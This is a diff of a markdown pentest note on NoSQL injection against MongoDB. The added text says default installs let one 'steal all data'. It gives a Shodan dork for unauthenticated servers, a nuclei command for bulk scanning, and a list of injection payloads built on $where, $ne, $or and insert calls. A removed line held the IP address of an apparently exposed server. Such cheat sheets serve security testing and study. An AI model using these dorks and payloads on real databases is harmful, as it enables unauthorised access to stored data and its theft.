@@ -1,11 +1,47 @@
 # NOSQL Injection
 
+MongoDB by default dos not have any credential and we can steal all data with shodan query
+
 ```
-- MongoDB Databases: https://www.digitalocean.com/community/tutorials/how-to-secure-mongodb-on-ubuntu-20-04
-    - "MongoDB Server Information" port:27017 -authentication
-    - "Set-Cookie: mongo-express=" "200 OK"
--  nuclei template 
-    - 𝙣𝙪𝙘𝙡𝙚𝙞 -l 𝙝𝙤𝙨𝙩𝙨.𝙩𝙭𝙩 -𝙩𝙖𝙜𝙨 𝙢𝙤𝙣𝙜𝙤𝙙𝙗
-    - https://github.com/projectdiscovery/nuclei-templates/blob/master/network/mongodb-unauth.yaml
-    - http://47.96.190.226:27017/
+"MongoDB Server Information" port:27017 -authentication
+```
+
+for connecting to MongoDB we can use 2 software&#x20;
+
+```
+1- MongoDB Compass (https://www.mongodb.com/try/download/compass)
+2- Navicat Premium
+```
+
+automatic find vulnerable MongoDB with nuclei:
+
+```
+𝙣𝙪𝙘𝙡𝙚𝙞 -l 𝙝𝙤𝙨𝙩𝙨.𝙩𝙭𝙩 -𝙩𝙖𝙜𝙨 𝙢𝙤𝙣𝙜𝙤𝙙𝙗
+```
+
+### automation
+
+nosqli burp extension is better than other because checking SSJI&#x20;
+
+```
+        - Burp NOSQLI Scanner
+        - https://github.com/Charlie-belmer/nosqli
+```
+
+### **NoSQL payload** <a href="#blob-path" id="blob-path"></a>
+
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" %}
+
+```
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+' || 'a'=='a
 ```
